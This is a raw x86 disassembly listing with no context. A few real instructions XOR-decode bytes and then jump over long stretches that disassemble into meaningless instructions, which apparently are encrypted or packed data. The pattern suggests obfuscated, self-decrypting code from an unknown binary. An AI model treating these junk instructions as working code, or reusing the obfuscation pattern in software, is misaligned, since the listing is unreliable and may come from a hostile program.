  40472d:	shr    ecx,0x2
  404730:	mov    ecx,DWORD PTR [ebp-0x30]
  404733:	mov    edx,DWORD PTR [ebp-0x2c]
  404736:	shl    ecx,0x1e
  404739:	mov    ecx,DWORD PTR [ebp-0x14]
  40473c:	xor    eax,edi
  40473e:	xor    edx,edx
  404740:	or     eax,edx
  404742:	mov    cl,BYTE PTR [eax+ecx*1]
  404745:	mov    eax,DWORD PTR [ebp-0x34]
  404748:	xor    BYTE PTR [eax],cl
  40474a:	mov    eax,DWORD PTR [ebp-0x20]
  40474d:	mov    ecx,DWORD PTR [ebp-0x1c]
  404750:	shrd   eax,ecx,0x2
  404754:	shr    ecx,0x2
  404757:	mov    ecx,DWORD PTR [ebp-0x20]
  40475a:	mov    edx,DWORD PTR [ebp-0x1c]
  40475d:	xor    eax,edi
  40475f:	jmp    0x404b00
  404764:	xchg   esp,eax
  404765:	mov    esi,DWORD PTR [esi-0x434b497e]
  40476b:	fwait
  40476c:	or     al,dl
  40476e:	cli    
  40476f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404770:	loope  0x40474d
  404772:	mov    al,ds:0xbe03be90
  404777:	mov    esi,0xbebec4bd
  40477c:	mov    BYTE PTR [eax],al
  40477e:	ds ret 0x6c3e
  404782:	sub    eax,0xd06a11
  404787:	push   ss
  404788:	(bad)  
  404789:	out    0xbe,al
  40478b:	add    eax,DWORD PTR [edx]
  40478d:	fdivr  st,st(3)
  40478f:	jb     0x4047f5
  404791:	in     al,dx
  404792:	cmp    esi,DWORD PTR [ebx-0x244f2c29]
  404798:	mul    DWORD PTR [ebx]
  40479a:	xor    esp,DWORD PTR [esi+0x6b]
  40479d:	or     dl,dh
  40479f:	repz into 
  4047a1:	jle    0x40472a
  4047a3:	inc    esi
  4047a4:	sbb    al,0xab
  4047a6:	push   edx
  4047a7:	das    
  4047a8:	push   ds
  4047a9:	idiv   DWORD PTR [esi-0x2e]
  4047ac:	add    al,0xc2
  4047ae:	sub    BYTE PTR [esp+edx*2],bl
  4047b1:	repz push edi
  4047b3:	jmp    0x9b6077b2
  4047b8:	aas    
  4047b9:	aaa    
  4047ba:	rol    BYTE PTR [esi],0x1d
  4047bd:	mov    eax,0x7f02d50d
  4047c2:	fnstcw WORD PTR [edi]
  4047c4:	(bad)  
  4047c5:	frstor [esi+0x1]
  4047c8:	cmp    DWORD PTR [eax+0x20e38d87],ebp
  4047ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047cf:	pop    es
  4047d0:	add    al,0xe9
  4047d2:	js     0x4047b7
  4047d4:	or     DWORD PTR [edx+0x12110461],ebp
  4047da:	fisttp WORD PTR [ebx-0x17]
  4047dd:	in     al,dx
  4047de:	adc    DWORD PTR [edi-0x6e],0x4ea4ab7d
  4047e5:	jg     0x404801
  4047e7:	(bad)  
  4047e8:	pop    eax
  4047e9:	and    ebp,DWORD PTR [ebx-0x443089b5]
  4047ef:	add    BYTE PTR [ecx+0x75bada6f],dh
  4047f5:	cld    
  4047f6:	dec    edx
  4047f7:	(bad)  
  4047f8:	ja     0x404837
  4047fa:	(bad)  
  4047fb:	shl    DWORD PTR [ebx],cl
  4047fd:	jmp    0xee08ff88
  404802:	pushf  
  404803:	mov    BYTE PTR [eax],dh
  404805:	pop    es
  404806:	push   esp
  404807:	aam    0x6b
  404809:	and    BYTE PTR [ecx+0x49d1db06],bh
  40480f:	pusha  
  404810:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404811:	mov    dl,0xca
  404813:	out    0xfc,eax
  404815:	outs   dx,BYTE PTR ds:[esi]
  404816:	fcom   QWORD PTR ds:0x5c02a2a8
  40481c:	jmp    DWORD PTR [ebp+eiz*4-0x223b832e]
  404823:	aam    0xcf
  404825:	sar    bl,cl
  404827:	xchg   esp,eax
  404828:	adc    al,0x1a
  40482a:	jnp    0x40483a
  40482c:	adc    al,0x6d
  40482e:	into   
  40482f:	retf   
  404830:	mov    eax,0x8099a041
  404835:	mov    esi,DWORD PTR [edx+0x1d]
  404838:	out    0xc6,al
  40483a:	cld    
  40483b:	shl    cl,1
  40483d:	fbstp  TBYTE PTR [edx+0x5547ef46]
  404843:	in     al,dx
  404844:	jmp    0x4047e7
  404846:	cmp    eax,0x27a5ac53
  40484b:	sbb    esp,ecx
  40484d:	cwde   
  40484e:	and    ebx,DWORD PTR [edi-0x22]
  404851:	xchg   BYTE PTR [ecx],dl
  404853:	popf   
  404854:	add    al,0x14
  404856:	push   edi
  404857:	mov    dh,0x3e
  404859:	sub    dh,BYTE PTR [ecx-0x4b]
  40485c:	inc    edi
  40485d:	xchg   ebp,eax
  40485e:	sub    DWORD PTR [eax],0xffffff88
  404861:	dec    ebx
  404862:	scas   eax,DWORD PTR es:[edi]
  404863:	not    BYTE PTR [edx]
  404865:	dec    esi
  404866:	sbb    dl,al
  404868:	inc    ecx
  404869:	ja     0x4048cf
  40486b:	icebp  
  40486c:	push   esp
  40486d:	sahf   
  40486e:	lahf   
  40486f:	xor    al,0xc6
  404871:	hlt    
  404872:	iret   
  404873:	ficomp WORD PTR [eax]
  404875:	pop    ecx
  404876:	fild   QWORD PTR [edi+edi*4+0x66d63bad]
  40487d:	out    0x20,al
  40487f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404880:	fcmovnbe st,st(4)
  404882:	xchg   esp,eax
  404883:	cld    
  404884:	adc    edi,esp
  404886:	gs test eax,0x3cb02acb
  40488c:	popa   
  40488d:	and    BYTE PTR [esi],bh
  40488f:	call   DWORD PTR [eax+0x21]
  404892:	clc    
  404893:	mov    esp,0x74e88268
  404898:	pop    ebp
  404899:	push   esi
  40489a:	rcr    DWORD PTR [eax+0x4c],cl
  40489d:	jge    0x40485a
  40489f:	or     al,0xd
  4048a1:	push   ds
  4048a2:	aam    0x94
  4048a4:	fs inc ecx
  4048a6:	jl     0x4048c9
  4048a8:	xchg   esi,eax
  4048a9:	stos   BYTE PTR es:[edi],al
  4048aa:	je     0x40486b
  4048ac:	ins    BYTE PTR es:[edi],dx
  4048ad:	mov    DWORD PTR [ecx],edi
  4048af:	jp     0x404852
  4048b1:	fcompp 
  4048b3:	ins    DWORD PTR es:[edi],dx
  4048b4:	fld    TBYTE PTR [edi]
  4048b6:	mov    ebx,0x45bbdbda
  4048bb:	dec    eax
  4048bc:	rol    bl,1
  4048be:	add    al,0xc9
  4048c0:	loope  0x404911
  4048c2:	imul   esp,esi,0x6f753de9
  4048c8:	cwde   
  4048c9:	loopne 0x404912
  4048cb:	cmc    
  4048cc:	adc    al,0x1a
  4048ce:	add    DWORD PTR [edi-0x4d],edi
  4048d1:	and    ah,BYTE PTR [ebp+0x73bbeadd]
  4048d7:	mov    ds:0x5bd3fe82,al
  4048dc:	add    eax,0x2b4479fa
  4048e1:	sbb    al,0x91
  4048e3:	shl    DWORD PTR [edi+0x58fa4567],0xaf
  4048ea:	inc    ebx
  4048eb:	jo     0x4048ef
  4048ed:	or     eax,0x6641cc46
  4048f2:	mov    bl,0x32
  4048f4:	jle    0x404950
  4048f6:	mov    ebx,0x6707660b
  4048fb:	xchg   esp,eax
  4048fc:	lods   al,BYTE PTR ds:[esi]
  4048fd:	stos   DWORD PTR es:[edi],eax
  4048fe:	and    ch,BYTE PTR [ecx-0x5d]
  404901:	and    DWORD PTR [edx],0xb7777926
  404907:	dec    edx
  404908:	xchg   edi,eax
  404909:	inc    ebx
  40490a:	arpl   bp,bx
  40490c:	loop   0x4048e3
  40490e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40490f:	mov    cl,0x86
  404911:	jne    0x40496d
  404913:	xchg   DWORD PTR [ebx],ebx
  404915:	adc    ecx,DWORD PTR [ecx+0x1bdc5468]
  40491b:	mov    BYTE PTR [edx],0xa
  40491e:	or     ah,dl
  404920:	push   ss
  404921:	xchg   DWORD PTR [esi-0x60],ebx
  404924:	out    0x80,al
  404926:	gs jbe 0x4048d7
  404929:	std    
  40492a:	and    dl,BYTE PTR [edi+0x6]
  40492d:	es push edx
  40492f:	mov    ebp,esp
  404931:	and    DWORD PTR [esi],ebp
  404933:	xor    ah,BYTE PTR [ebp-0x20]
  404936:	jecxz  0x404999
  404938:	test   DWORD PTR [ecx-0x30],esi
  40493b:	ret    0xf570
  40493e:	mov    dl,0x63
  404940:	dec    ebp
  404941:	adc    BYTE PTR [esi-0x80],bh
  404944:	out    0x8f,al
  404946:	aam    0x4f
  404948:	xor    cl,bl
  40494a:	inc    ebx
  40494b:	inc    eax
  40494c:	add    dl,BYTE PTR [ecx+eax*1-0x14]
  404950:	arpl   WORD PTR [ecx+0x42df0f0e],sp
  404956:	xlat   BYTE PTR ds:[ebx]
  404957:	in     al,dx
  404958:	sbb    DWORD PTR [ebp+0x40],ebx
  40495b:	mov    edi,0xac4fdda9
  404960:	jbe    0x4049df
  404962:	jnp    0x4049cc
  404964:	aam    0xbf
  404966:	adc    ebx,DWORD PTR [eax]
  404968:	dec    esi
  404969:	ss cmp al,0xcd
  40496c:	dec    ebp
  40496d:	enter  0x1bb2,0x54
  404971:	xor    DWORD PTR [eax],ecx
  404973:	sbb    ecx,DWORD PTR [edx+0x285d4089]
  404979:	xchg   BYTE PTR [esi-0x77],ch
  40497c:	pop    ecx
  40497d:	popa   
  40497e:	sub    al,0x7f
  404980:	sbb    dh,BYTE PTR [ebx-0x7e4f06fd]
  404986:	(bad)  [di-0x4]
  40498a:	test   eax,0xacfa76a5
  40498f:	and    DWORD PTR [ebp-0x780cc3e9],esp
  404995:	test   eax,0xa9cab564
  40499a:	add    BYTE PTR [ebx],bl
  40499c:	sub    DWORD PTR [edi],edx
  40499e:	in     eax,dx
  40499f:	adc    bl,dl
  4049a1:	aaa    
  4049a2:	sub    ecx,DWORD PTR [edi+eiz*8-0x31]
  4049a6:	scas   al,BYTE PTR es:[edi]
  4049a7:	push   edi
  4049a8:	and    DWORD PTR [ebx+0x1aa87f90],esp
  4049ae:	lahf   
  4049af:	sbb    eax,0x4f2d31d9
  4049b4:	jle    0x4049a0
  4049b6:	sub    dh,cl
  4049b8:	add    ebp,DWORD PTR [esi]
  4049ba:	mov    DWORD PTR [ecx],edi
  4049bc:	retf   
  4049bd:	pop    ds
  4049be:	mov    cl,0x7a
  4049c0:	aas    
  4049c1:	inc    edx
  4049c2:	loop   0x404a2e
  4049c4:	and    dh,dh
  4049c6:	jecxz  0x404a20
  4049c8:	xchg   edx,eax
  4049c9:	add    ebx,DWORD PTR [edi+0x27]
  4049cc:	pop    ss
  4049cd:	test   BYTE PTR [ecx],bl
  4049cf:	sbb    al,0xa1
  4049d1:	or     DWORD PTR [eax],eax
  4049d3:	xor    DWORD PTR [ebp+ebp*1-0x4f],edi
  4049d7:	xor    BYTE PTR [eax+0x5ef54630],ah
  4049dd:	cmp    dh,BYTE PTR ds:0x6841d576
  4049e3:	mov    ebp,0x1ba22d06
  4049e8:	dec    ebx
  4049e9:	cmp    al,0x52
  4049eb:	and    BYTE PTR [edx+0x12],dl
  4049ee:	out    0xbc,eax
  4049f0:	jl     0x404a6e
  4049f2:	dec    ebp
  4049f3:	in     eax,dx
  4049f4:	and    al,0xb8
  4049f6:	pop    ebp
  4049f7:	loopne 0x404a26
  4049f9:	out    0x85,al
  4049fb:	ins    DWORD PTR es:[edi],dx
  4049fc:	scas   al,BYTE PTR es:[edi]
  4049fd:	rol    bh,1
  4049ff:	mov    bl,0xd5
  404a01:	ficomp WORD PTR [ecx+eiz*2-0x48]
  404a05:	adc    al,0x9c
  404a07:	in     eax,dx
  404a08:	sub    edi,DWORD PTR [esi+0x15f2949e]
  404a0e:	mov    ecx,0x3e8f6c26
  404a13:	jno    0x404a0e
  404a15:	int    0xf1
  404a17:	and    ah,bh
  404a19:	cmp    ebx,DWORD PTR [eax+0xf]
  404a1c:	fs dec esp
  404a1e:	das    
  404a1f:	push   0xf8ef31de
  404a24:	mov    ah,0xa8
  404a26:	adc    ah,cl
  404a28:	mov    edi,0x3fb33746
  404a2d:	adc    DWORD PTR [esi],0x263fa3d
  404a33:	add    eax,0x240f00e5
  404a38:	pop    es
  404a39:	ins    DWORD PTR es:[edi],dx
  404a3a:	scas   al,BYTE PTR es:[edi]
  404a3b:	hlt    
  404a3c:	mov    dl,0x7
  404a3e:	push   esi
  404a3f:	sub    eax,0x1872e8a2
  404a44:	enter  0xec3c,0xff
  404a48:	(bad)  
  404a49:	pop    esi
  404a4a:	(bad)  
  404a4b:	outs   dx,BYTE PTR ds:[esi]
  404a4c:	fstp   st(4)
  404a4e:	cmp    eax,0x90b2b7dc
  404a53:	pop    eax
  404a54:	inc    ebp
  404a55:	icebp  
  404a56:	mov    BYTE PTR [ebp-0x7627bdbc],dh
  404a5c:	into   
  404a5d:	or     BYTE PTR [eax+0x5eb8cf9e],0x4d
  404a64:	sbb    al,0x9
  404a66:	in     eax,0x43
  404a68:	retf   
  404a69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a6a:	mov    eax,ds:0x3ed9113d
  404a6f:	(bad)  
  404a70:	cld    
  404a71:	les    esi,FWORD PTR [esi+ecx*8]
  404a74:	ja     0x404a4c
  404a76:	xor    ah,dl
  404a78:	xor    al,0x9f
  404a7a:	mov    bh,0x2a
  404a7c:	cwde   
  404a7d:	push   cs
  404a7e:	inc    edx
  404a7f:	mov    ebp,gs
  404a81:	fwait
  404a82:	jecxz  0x404a8d
  404a84:	loope  0x404a4d
  404a86:	(bad)  
  404a87:	jbe    0x404a74
  404a89:	bound  ebx,QWORD PTR [esi-0x1a]
  404a8c:	inc    esi
  404a8d:	add    DWORD PTR [ebx-0x43],esp
  404a90:	rol    DWORD PTR [eax],cl
  404a92:	cmp    al,0xb
  404a94:	and    ebp,DWORD PTR [ebx+0x38]
  404a97:	pop    edi
  404a98:	mov    ds:0xb862b36c,eax
  404a9d:	pop    ds
  404a9e:	fist   WORD PTR [edi]
  404aa0:	arpl   WORD PTR [eax],cx
  404aa2:	pop    ds
  404aa3:	aaa    
  404aa4:	fcomp  QWORD PTR [ecx-0x45]
  404aa7:	jmp    0xd49:0xf0fb7f9d
  404aae:	add    al,0xd6
  404ab0:	in     al,0xd8
  404ab2:	push   esp
  404ab3:	mov    eax,fs:0x6fe0355c
  404ab9:	lods   eax,DWORD PTR ds:[esi]
  404aba:	push   es
  404abb:	adc    al,0x83
  404abd:	mov    ch,BYTE PTR [ebx+ebp*4-0x4]
  404ac1:	pushf  
  404ac2:	inc    ecx
  404ac3:	shl    BYTE PTR [ebp-0x2622c829],1
  404ac9:	xchg   ebx,eax
  404aca:	jbe    0x404b1b
  404acc:	sub    al,0x2b
  404ace:	pop    ss
  404acf:	sbb    dl,bl
  404ad1:	rol    ah,1
  404ad3:	data16 mov fs,WORD PTR [ebp+0x2036d9b5]
  404ada:	ds push esi
  404adc:	or     al,0x8d
  404ade:	and    eax,0xa40766fb
  404ae3:	in     eax,0x3e
  404ae5:	es (bad) 
  404ae8:	pop    es
  404ae9:	fidivr DWORD PTR fs:[eax-0x3cfb4e47]
  404af0:	out    0x92,eax
  404af2:	push   ds
  404af3:	cmp    eax,ebp
  404af5:	mov    esp,0x994f6e34
  404afa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404afb:	ret    
  404afc:	sub    DWORD PTR [esp+esi*8],0x1ee1c1b0
  404b03:	xor    edx,edx
  404b05:	or     eax,edx
  404b07:	lea    eax,[ebp+eax*1-0x4]
  404b0b:	mov    DWORD PTR [ebp-0x34],eax
  404b0e:	mov    eax,DWORD PTR [ebp-0x20]
  404b11:	mov    ecx,DWORD PTR [ebp-0x1c]
  404b14:	shrd   eax,ecx,0x2
  404b18:	shr    ecx,0x2
  404b1b:	mov    ecx,DWORD PTR [ebp-0x20]
  404b1e:	mov    edx,DWORD PTR [ebp-0x1c]
  404b21:	shl    ecx,0x1e
  404b24:	mov    ecx,DWORD PTR [ebp-0x14]
  404b27:	jmp    0x404ec8
  404b2c:	cmp    BYTE PTR [edx],ch
  404b2e:	push   0xffffff83
  404b30:	jl     0x404ab5
  404b32:	cmp    BYTE PTR [edx-0x61edfbc6],bh
  404b38:	dec    ebx
  404b39:	jle    0x404b45
  404b3b:	xchg   edx,eax
  404b3c:	mov    ebp,0xbdbebe09
  404b41:	les    edi,FWORD PTR [esi-0x706df42]
  404b47:	fcomp  QWORD PTR [edx-0x60]
  404b4a:	sbb    edi,DWORD PTR [esi-0x66]
  404b4d:	iret   
  404b4e:	aaa    
  404b4f:	shr    ebp,1
  404b51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b52:	xor    edi,ebp
  404b54:	sub    BYTE PTR [ebx-0x146a6558],ch
  404b5a:	scas   eax,DWORD PTR es:[edi]
  404b5b:	add    ah,BYTE PTR [ecx-0x66]
  404b5e:	sbb    DWORD PTR ds:0x348da0da,ebp
  404b64:	mov    esi,DWORD PTR ds:0xcaf29523
  404b6a:	call   DWORD PTR [eax-0x59]
  404b6d:	or     BYTE PTR [eax+0x78],dl
  404b70:	aas    
  404b71:	and    al,0x8
  404b73:	rol    DWORD PTR [eax+0x5af3711e],1
  404b79:	inc    esp
  404b7a:	push   ss
  404b7b:	push   ebx
  404b7c:	daa    
  404b7d:	mov    edx,0x103b1a9a
  404b82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b83:	jo     0x404bdd
  404b85:	imul   DWORD PTR [edx+0x6b]
  404b88:	mov    al,ah
  404b8a:	repnz cmp al,0x3f
  404b8d:	pop    esp
  404b8e:	cmp    bh,BYTE PTR [eax]
  404b90:	sub    dl,dh
  404b92:	adc    eax,0x7b9a7b1f
  404b97:	mov    ds:0x6ad9b473,al
  404b9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b9d:	cmp    edi,DWORD PTR [edi-0x43]
  404ba0:	push   ds
  404ba1:	jmp    0x404b2b
  404ba3:	sbb    cl,BYTE PTR [edx+0x3484879e]
  404ba9:	rol    BYTE PTR [ecx+0x2286044a],0x48
  404bb0:	fdiv   st(5),st
  404bb2:	lahf   
  404bb3:	inc    edi
  404bb4:	cmovs  eax,DWORD PTR [eax-0x7c]
  404bb8:	sahf   
  404bb9:	dec    ebp
  404bba:	mov    ecx,0x5dfbec74
  404bbf:	inc    edi
  404bc0:	cmp    al,0xaa
  404bc2:	pop    esi
  404bc3:	test   al,0x1e
  404bc5:	jae    0x404ba1
  404bc7:	mov    cl,BYTE PTR [eax]
  404bc9:	addr16 mov dl,0x64
  404bcc:	cmc    
  404bcd:	pop    ds
  404bce:	pop    esi
  404bcf:	enter  0x3e56,0x1b
  404bd3:	in     eax,0x95
  404bd5:	out    dx,eax
  404bd6:	stos   DWORD PTR es:[edi],eax
  404bd7:	mov    DWORD PTR [ebp+0x543646e9],esi
  404bdd:	imul   eax,DWORD PTR [eax-0x3da09d3],0xffffff93
  404be4:	lahf   
  404be5:	clc    
  404be6:	fsqrt  
  404be8:	pop    edx
  404be9:	and    eax,0x99a5a839
  404bee:	call   0xb8f6:0x6bc6b717
  404bf5:	lock les esi,FWORD PTR [ebp-0x14]
  404bf9:	repnz scas eax,DWORD PTR es:[edi]
  404bfb:	ja     0x404c12
  404bfd:	jge    0x404c00
  404bff:	popf   
  404c00:	stc    
  404c01:	test   ch,bh
  404c03:	loop   0x404bf7
  404c05:	outs   dx,DWORD PTR ds:[esi]
  404c06:	ins    DWORD PTR es:[edi],dx
  404c07:	imul   esi,DWORD PTR [eax-0x350ca8b7],0xffffffb7
  404c0e:	scas   al,BYTE PTR es:[edi]
  404c0f:	out    dx,eax
  404c10:	stc    
  404c11:	lock jecxz 0x404ba9
  404c14:	mov    bh,ah
  404c16:	mov    BYTE PTR [ebp+edx*2-0x17c62eea],al
  404c1d:	cli    
  404c1e:	ret    0x8cdc
  404c21:	je     0x404bf0
  404c23:	pop    esp
  404c24:	adc    ecx,DWORD PTR [eax+0x53]
  404c27:	jbe    0x404bb8
  404c29:	lahf   
  404c2a:	dec    ecx
  404c2b:	mov    eax,0xa93889ae
  404c30:	ins    BYTE PTR es:[edi],dx
  404c31:	xlat   BYTE PTR ds:[ebx]
  404c32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c33:	sub    al,0x35
  404c35:	(bad)  
  404c37:	mov    al,0x1a
  404c39:	push   edi
  404c3a:	jmp    0x1c10:0xf2be092e
  404c41:	add    ebp,esi
  404c43:	dec    edx
  404c44:	ja     0x404c17
  404c46:	sbb    edx,esp
  404c48:	pop    ss
  404c49:	int3   
  404c4a:	dec    esp
  404c4b:	xlat   BYTE PTR ds:[ebx]
  404c4c:	sub    BYTE PTR [ebx],dl
  404c4e:	fcmovbe st,st(0)
  404c50:	dec    edi
  404c52:	data16 mov bl,0xa8
  404c55:	das    
  404c56:	ror    BYTE PTR [ebp-0x77],cl
  404c59:	inc    ecx
  404c5a:	add    ebp,DWORD PTR [ebp-0x1e]
  404c5d:	sub    BYTE PTR [eax],dh
  404c5f:	adc    DWORD PTR [ecx+0x35],ebx
  404c62:	xor    DWORD PTR [edx],eax
  404c64:	jp     0x404bec
  404c66:	test   eax,0xc937602e
  404c6b:	ins    BYTE PTR es:[edi],dx
  404c6c:	mov    eax,ds:0x5e0c6b4d
  404c71:	adc    al,BYTE PTR [eax+0x73d9a91]
  404c77:	dec    edx
  404c78:	lahf   
  404c79:	in     eax,dx
  404c7a:	outs   dx,DWORD PTR ds:[esi]
  404c7b:	or     ebx,DWORD PTR [ecx]
  404c7d:	jecxz  0x404c33
  404c7f:	add    BYTE PTR [esi*2-0x45a5cf09],0x21
  404c87:	adc    bl,cl
  404c89:	push   esi
  404c8a:	xchg   BYTE PTR [ebx-0x5c],ch
  404c8d:	xor    eax,0xf6da229b
  404c92:	jge    0x404c47
  404c94:	ins    BYTE PTR es:[edi],dx
  404c95:	dec    edx
  404c96:	sub    eax,0xa337ddd0
  404c9b:	stos   DWORD PTR es:[edi],eax
  404c9c:	clc    
  404c9d:	in     al,dx
  404c9e:	jp     0x404ce0
  404ca0:	lock es push cs
  404ca3:	pop    ds
  404ca4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ca5:	xor    eax,0x1a47a037
  404caa:	ret    0xcf3e
  404cad:	lods   al,BYTE PTR ds:[esi]
  404cae:	xchg   esi,eax
  404caf:	lahf   
  404cb0:	push   esp
  404cb1:	pop    ecx
  404cb2:	and    al,0xf
  404cb4:	ins    BYTE PTR es:[edi],dx
  404cb5:	dec    esi
  404cb6:	mov    ebx,0x224399ed
  404cbb:	lock sub eax,0xfe60dff8
  404cc1:	pop    ss
  404cc2:	inc    edi
  404cc3:	add    esp,DWORD PTR [eax-0x1f]
  404cc6:	test   BYTE PTR [eax],ch
  404cc8:	(bad)  
  404cc9:	jne    0x404d0a
  404ccb:	repz cmp dl,BYTE PTR [edi]
  404cce:	nop
  404ccf:	jl     0x404cd6
  404cd1:	ins    DWORD PTR es:[edi],dx
  404cd2:	add    eax,0x8016a188
  404cd7:	pop    ss
  404cd8:	lds    ebp,FWORD PTR [edx]
  404cda:	fnstcw WORD PTR [ecx+ebx*4+0x134f7cff]
  404ce1:	cmp    al,ah
  404ce3:	in     eax,0x69
  404ce5:	loopne 0x404c82
  404ce7:	lods   al,BYTE PTR ds:[esi]
  404ce8:	ror    ch,1
  404cea:	push   ebp
  404ceb:	add    eax,edi
  404ced:	scas   eax,DWORD PTR es:[edi]
  404cee:	xor    BYTE PTR [ecx],dh
  404cf0:	ret    0x823a
  404cf3:	sub    al,0x39
  404cf5:	(bad)  
  404cf7:	jae    0x404d5a
  404cf9:	dec    esp
  404cfa:	jnp    0x404cd8
  404cfc:	stc    
  404cfd:	cdq    
  404cfe:	mov    ss,esp
  404d00:	fcomip st,st(1)
  404d02:	popa   
  404d03:	xchg   ebp,eax
  404d04:	fcmovbe st,st(2)
  404d06:	lods   al,BYTE PTR ds:[esi]
  404d07:	fdiv   st(3),st
  404d09:	imul   ecx
  404d0b:	jp     0x404d05
  404d0d:	jne    0x404d34
  404d0f:	mov    cl,al
  404d11:	enter  0x95b6,0x73
  404d15:	jns    0x404d1c
  404d17:	add    al,BYTE PTR [edi-0x80]
  404d1a:	xchg   ecx,eax
  404d1b:	ja     0x404ceb
  404d1d:	mov    ch,0x47
  404d1f:	jmp    0xae4a:0xcc09067d
  404d26:	pop    ebx
  404d27:	rcr    DWORD PTR [eax+0x9175ef],cl
  404d2d:	loope  0x404d30
  404d2f:	or     al,0x31
  404d31:	push   ebp
  404d32:	mov    bh,0xaa
  404d34:	loope  0x404d11
  404d36:	cmp    dl,0x49
  404d39:	(bad)  
  404d3a:	jecxz  0x404d22
  404d3c:	sbb    edi,DWORD PTR [ebp+0x54]
  404d3f:	push   ss
  404d40:	das    
  404d41:	hlt    
  404d42:	jbe    0x404d45
  404d44:	stos   DWORD PTR es:[edi],eax
  404d45:	jo     0x404d30
  404d47:	sub    DWORD PTR [ebx+ebx*8],ebx
  404d4a:	mov    cl,0x7d
  404d4c:	mov    ah,0xa0
  404d4e:	mov    ebx,DWORD PTR [ecx+0x7686aaed]
  404d54:	jns    0x404d03
  404d56:	and    BYTE PTR [edx+0x12],dh
  404d59:	das    
  404d5a:	fs cwde 
  404d5c:	and    BYTE PTR [eax],ch
  404d5e:	xchg   BYTE PTR [edx],ah
  404d60:	je     0x404d42
  404d62:	aaa    
  404d63:	mov    BYTE PTR [eax-0x74958bfe],bh
  404d69:	inc    esi
  404d6a:	mov    ds:0xcb114d0e,al
  404d6f:	lea    esp,[ecx-0x62]
  404d72:	inc    eax
  404d73:	mov    bh,0x8e
  404d75:	adc    DWORD PTR [edx],0xffffff8e
  404d78:	lds    esp,FWORD PTR [ebx-0x48]
  404d7b:	push   ecx
  404d7c:	sti    
  404d7d:	or     DWORD PTR [ebx],ebp
  404d7f:	dec    esi
  404d80:	push   cs
  404d81:	cmc    
  404d82:	aas    
  404d83:	mov    al,0x6b
  404d85:	gs ret 
  404d87:	sbb    bh,BYTE PTR [esi+0x2ba1ddbf]
  404d8d:	rcl    BYTE PTR [eax],0xdf
  404d90:	sbb    DWORD PTR [edi+0x40],esi
  404d93:	mov    edi,0xe18a7940
  404d98:	mov    dl,0xbe
  404d9a:	test   edx,0x632aedbd
  404da0:	inc    edi
  404da1:	mov    BYTE PTR [ebx],dl
  404da3:	dec    esi
  404da4:	push   edx
  404da5:	xchg   ebx,eax
  404da6:	loope  0x404d65
  404da8:	dec    esp
  404da9:	dec    edi
  404daa:	pop    ebx
  404dab:	stos   DWORD PTR es:[edi],eax
  404dac:	clc    
  404dad:	mov    edx,0xba168bef
  404db2:	icebp  
  404db3:	sub    eax,0x1d34c697
  404db8:	loope  0x404dc7
  404dba:	mov    esp,0x1354cfac
  404dbf:	dec    esp
  404dc0:	aam    0xa
  404dc2:	inc    ebx
  404dc3:	cwde   
  404dc4:	in     al,dx
  404dc5:	jno    0x404e3c
  404dc7:	sub    bl,BYTE PTR [ecx+0x4b]
  404dca:	mov    edi,DWORD PTR [edx]
  404dcc:	mov    eax,ds:0x741982b4
  404dd1:	inc    ebx
  404dd2:	or     al,0x9c
  404dd4:	dec    ecx
  404dd5:	dec    edi
  404dd6:	scas   eax,DWORD PTR es:[edi]
  404dd7:	aam    0x67
  404dd9:	mov    dl,0xf2
  404ddb:	or     eax,0xa8fb0655
  404de0:	mov    ch,0x86
  404de2:	nop
  404de3:	stos   BYTE PTR es:[edi],al
  404de4:	in     al,0xe2
  404de6:	mov    ch,0x9c
  404de8:	daa    
  404de9:	mov    al,ds:0x206ef430
  404dee:	xor    BYTE PTR [edx-0xae82d0f],al
  404df4:	mov    eax,0x92482548
  404df9:	jb     0x404e16
  404dfb:	loope  0x404d8e
  404dfd:	out    0x21,al
  404dff:	add    dh,dh
  404e01:	arpl   WORD PTR [ecx-0x19],di
  404e04:	adc    ch,BYTE PTR [esi-0x6c]
  404e07:	es cli 
  404e09:	call   DWORD PTR [edx]
  404e0b:	cs jne 0x404e25
  404e0e:	inc    edx
  404e0f:	rcl    DWORD PTR [eax+0x5ae06ae],1
  404e15:	dec    esp
  404e16:	(bad)  
  404e17:	dec    ebp
  404e18:	lahf   
  404e19:	dec    esp
  404e1a:	ss js  0x404e14
  404e1d:	or     ebx,DWORD PTR [edi]
  404e1f:	call   0xb5fa:0x21a454c3
  404e26:	mov    ch,0x35
  404e28:	icebp  
  404e29:	push   cs
  404e2a:	fild   WORD PTR [ecx+ebx*4]
  404e2d:	push   esi
  404e2e:	mov    esp,0x1e22c209
  404e33:	adc    al,0xd0
  404e35:	in     eax,0x59
  404e37:	lahf   
  404e38:	imul   edx,DWORD PTR [esi+0x1f],0x56
  404e3c:	push   es
  404e3d:	jne    0x404e6a
  404e3f:	fld    st(4)
  404e41:	int3   
  404e42:	(bad)  
  404e43:	fmul   st(6),st
  404e45:	jb     0x404e23
  404e47:	sub    eax,0xee855e92
  404e4c:	in     eax,dx
  404e4d:	dec    edi
  404e4e:	sbb    eax,0x1fde8202
  404e53:	or     BYTE PTR [ebx-0x74155a22],0xd2
  404e5a:	loope  0x404e9a
  404e5c:	adc    al,0x75
  404e5e:	xchg   edi,eax
  404e5f:	jl     0x404e48
  404e61:	xchg   ebx,eax
  404e62:	mov    ebp,0x75525331
  404e67:	push   es
  404e68:	lods   eax,DWORD PTR ds:[esi]
  404e69:	dec    eax
  404e6b:	sbb    eax,0x6b0c00ff
  404e70:	dec    edx
  404e71:	sbb    DWORD PTR [ebp-0x54],esi
  404e74:	aad    0xfd
  404e76:	enter  0x4685,0x80
  404e7a:	ss dec ebx
  404e7c:	aas    
  404e7d:	iret   
  404e7e:	cdq    
  404e7f:	or     DWORD PTR [edx],eax
